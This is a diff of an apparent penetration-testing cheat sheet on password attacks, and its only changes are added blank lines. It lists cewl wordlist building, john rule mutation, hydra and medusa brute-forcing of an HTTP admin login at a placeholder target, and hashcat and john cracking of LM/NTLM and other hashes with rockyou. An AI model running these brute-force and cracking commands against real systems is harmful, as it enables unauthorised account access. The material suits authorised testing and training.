@@ -1,5 +1,5 @@
-
 Cewl
+
 cewl http://<targetip>/ -m 6 -w cewl.txt
 wc -l cewl.txt
 john --wordlist=cewl.txt --rules --stdout > mutated.txt
@@ -23,6 +23,7 @@ hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> h
 -----------------------------------
 
 Medusa
+
 medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
 
 -----------------------------------
@@ -37,6 +38,7 @@ hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
 -----------------------------------
 
 LM/NTLM
+
 hashcat -h | grep -i lm 
 hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
 
@@ -48,7 +50,9 @@ When you find some digits, check if it's 32 bit
 echo -n ....... | wc -c
 
 ------------------------------------------
+
 John
+
 john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt 
 
 
